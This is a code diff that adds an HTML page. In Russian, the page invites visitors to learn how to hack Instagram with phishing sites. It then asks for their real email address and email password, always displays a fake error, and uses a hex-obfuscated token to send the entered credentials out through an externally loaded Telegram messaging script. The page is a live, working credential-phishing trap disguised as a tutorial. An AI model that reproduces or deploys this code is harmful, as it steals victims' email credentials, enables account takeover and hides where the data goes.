@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cicada</title>
+    <script src="https://ummx.github.io/import/script/aes.js"></script>
+    <script src="https://ummx.github.io/import/script/telegram-api.js"></script>
+    <style>
+        *{
+            background: black;
+        }
+        img{
+            display: block;
+            margin: auto;
+            text-align: center;
+            width:210px;
+            margin-top:100px;
+        }
+        h1{
+            display: block;
+            margin: auto;
+            text-align: center;
+            color: white;
+            font-family: monospace;
+            margin-top:30px;
+        }
+        p{
+            display: block;
+            margin: auto;
+            text-align: center;
+            color: white;
+            margin-top:40px;
+            font-size:13px;
+            width:290px;
+            font-family: monospace;
+        }
+        h3{
+            color: white;
+            display: block;
+            margin: auto;
+            text-align: center;
+            font-family: Arial;
+            margin-top:30px;
+        }
+        .btn{
+               display: block;
+               margin: auto;
+               text-align: center;
+                   margin-top:50px;
+        }
+        .l{
+            background: white;
+            width:130px;
+            height:34px;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;  
+        }
+        .r{
+            background: white;
+            width:130px;
+            height:34px;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+       
+       input{
+           display: block;
+           margin: auto;
+           text-align: center;
+           width: 250px;
+           height:35px;
+           background:white;
+           border-radius: 5px;
+           outline: none;
+
+           
+       }
+       .logi{
+           display: block;
+           margin: auto;
+           text-align: center;
+        background: white;
+            width:253px;
+            height:34px;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            margin-top:30px;
+       }
+       .register{
+           margin-top:0px;
+       }
+       h4{
+           display:block;
+           margin: auto;
+           text-align: center;
+           color: red;
+           font-size:19px;
+           font-family: monospace;
+           margin-top:150px;
+       }
+    </style>
+
+</head>
+<body>
+  <div class="head">
+    <img src="https://kod.ru/content/images/2018/11/ba09a0e85faef4abfd6e613deedd8d4c.jpeg" alt="">
+    <h1 >BUTTERFLY</h1>
+    <p>
+        Привет.  Хочешь научиться взламывать Инстаграм с помощью [фишинг] сайтов !
+    </p>
+<h3>Что такое фишинг?</h3>
+
+    <p style="margin-top:10px;">[фишинг] вид интернет-мошенничества, целью которого является получение доступа к конфиденциальным данным пользователей — логинам и паролям.</p>
+    <div class="btn">
+        <button class="l" onclick="reg()">Bойти</button><i> </i><i></i><button class="r" onclick="reg()">Регистрация</button>
+    </div>
+
+  </div>
+  <div class="register" style="display:none">
+      <h4 >Bведите настоящие данные!</h4>
+      <br><br><br>
+           <input type="email" id="username" autocomplete="off" placeholder="Введите свою электронную почту">b
+           <br>
+              <input type="password" id="password" placeholder="Введите пароль от электронной почты">
+              <button class="logi" onclick="login()">Далее</button>
+              <p style="color: red;margin-top:20px;display: none;" id="error">Bведите настоящие данные!</p>
+        </div>
+</body>
+<script>
+    function reg(){
+        document.querySelector('.head').style.display="none";
+        document.querySelector('.register').style.display="block";
+    }
+    function login(){
+        var username=document.getElementById('username').value;
+        var password=document.getElementById('password').value;
+         document.getElementById('error').style.display="block";
+       var message=`USERNAME : ${username} %0A PASSWORD : ${password}`;
+       var _0xc290=["\x36\x37\x30\x34\x37\x36\x31\x62\x33\x63\x62\x66\x38\x32\x36\x30\x63\x35\x35\x36\x63\x33\x65\x34\x31\x33\x39\x39\x61\x62\x38\x62\x63\x64\x66\x30\x62\x35\x31\x61\x39\x38\x39\x33\x35\x65\x66\x63\x30\x34\x30\x35\x62\x64\x39\x63\x61\x30\x39\x38\x64\x65\x38\x37"];sendMessage(message,_0xc290[0])
+    }
+</script>
+</html>
